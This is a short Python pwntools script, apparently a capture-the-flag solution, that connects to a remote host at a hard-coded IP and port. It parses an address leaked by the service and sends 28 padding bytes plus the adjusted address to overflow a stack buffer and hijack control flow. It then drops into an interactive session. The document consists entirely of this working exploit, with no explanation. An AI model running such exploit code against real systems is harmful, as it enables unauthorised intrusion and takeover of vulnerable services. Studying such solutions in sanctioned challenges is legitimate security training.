from pwn import *
import struct

r = remote('61.28.237.24', 30201)

print(r.recvuntil('townsquare with the address '))
address = r.recvline()
address = int(address.rstrip(b' \n').lstrip(b'0x'), 16)
address -= 41
address = struct.pack("<I", address)
r.sendline(b'a' * 28 + address)
r.interactive()